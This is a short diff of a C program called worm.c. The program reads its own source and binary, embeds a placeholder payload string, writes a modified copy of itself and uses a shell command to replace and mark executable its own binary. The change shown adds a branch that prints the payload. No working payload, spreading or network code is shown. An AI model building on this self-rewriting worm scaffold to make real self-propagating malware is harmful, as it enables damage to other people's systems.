@@ -2,7 +2,6 @@
 #include <stdlib.h>
 
 int NUM_CHARS = 10000;
-static char a[100] = "hello <insert name here>";
 static char target[5000] = "<insert payload here>";
 
 
@@ -56,13 +55,18 @@ int main(){
 	char *source = read_source("worm.c");
 	char *binary = read_binary("worm");
 
-	fiddle(source,binary);
+	if(target[0] =='#'){
+		printf("%s\n", target);
+	}else{ 
+		fiddle(source,binary);
+	}
 
 
 	FILE *op = fopen("wormy","wb");
 	fwrite(binary,sizeof(char), sizeof(binary)*NUM_CHARS,op);
 	fclose(op);
 	system("mv wormy worm; chmod +x worm");
+
 	
 
 	free(source);
